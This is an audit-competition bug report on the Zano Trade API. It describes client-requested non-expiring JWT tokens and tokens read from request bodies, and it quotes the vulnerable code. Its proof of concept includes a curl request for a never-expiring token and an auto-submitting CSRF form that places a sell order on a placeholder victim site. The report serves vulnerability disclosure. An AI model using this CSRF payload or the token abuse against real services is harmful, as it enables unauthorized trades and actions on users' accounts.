# #47725 \[W\&A-Insight] Non-Expiring Tokens and CSRF Exposure

**Submitted on Jun 19th 2025 at 10:04:39 UTC by @Opzteam for** [**IOP | Zano Trade**](https://immunefi.com/audit-competition/iop-zano-trade)

* **Report ID:** #47725
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/PRavaga/zano-p2p/blob/master/api/controllers/auth.controller.ts>
* **Impacts:**
  * Taking and/modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as:
* Changing registration information
* Commenting
* Voting
* Making trades
* Withdrawals, etc.

## Description

* The authentication system contains a critical vulnerability where clients can request non-expiring JWT tokens through an unvalidated neverExpires flag, and tokens are transmitted via request bodies instead of secure headers. This combination creates significant security risks including indefinite exposure of compromised tokens and susceptibility to Cross-Site Request Forgery (CSRF) attacks. If exploited, attackers could gain persistent unauthorized access to user accounts and perform actions on behalf of authenticated users without their knowledge.
* The vulnerability exists in two critical components of the JWT authentication system:

1. In api/controllers/auth.controller.ts, the authentication endpoint accepts a neverExpires flag directly from the request body without any validation or authorization checks:

```
const userData: AuthData = req.body.data;
const {neverExpires} = req.body;  //  Client-controlled expiration policy
// ...
const token = jwt.sign({ ...userData }, process.env.JWT_SECRET || "", 
    neverExpires ? undefined : { expiresIn: "24h" });  //  No expiration if neverExpires is true
```

* Any client can set neverExpires: true in their authentication request to receive a token that never expires. This violates fundamental security principles where token lifetimes should be strictly controlled by the server, not dictated by potentially malicious clients.

2. The token verification middleware in api/middleware/middleware.ts reads JWT tokens from the request body instead of the standard Authorization header:

```
async verifyToken(req: Request, res: Response, next: NextFunction) {
    try {
        const userData = jwt.verify(req.body.token, process.env.JWT_SECRET || "") as UserData;  //  Token in body
        req.body.userData = userData;
        next();
    } catch {
        res.status(401).send({ success: false, data: "Unauthorized (JWT)" });
    }
}
```

* This approach makes the application vulnerable to CSRF attacks since tokens are included in request bodies that can be automatically submitted by malicious websites.

## Proof of Concept

## Proof of Concept

* Non Expiring token check:

```
# Request a non-expiring token
curl -X POST http://localhost:3000/api/auth \
  -H "Content-Type: application/json" \
  -d '{
    "data": {
      "address": "user_wallet_address",
      "alias": "user_alias",
      "signature": "valid_signature",
      "message": "auth_message"
    },
    "neverExpires": true
  }'

# Server responds with a token that never expires
# This token remains valid indefinitely
```

* CSRF

```
<!-- Malicious website that performs unauthorized actions -->
<form action="http://victim-site.com/api/orders/create" method="POST" id="csrfForm">
  <input type="hidden" name="token" value="stolen_or_session_token">
  <input type="hidden" name="order_data" value='{"type":"sell","amount":1000}'>
</form>
<script>
  // Automatically submit when page loads
  document.getElementById('csrfForm').submit();
</script>
```
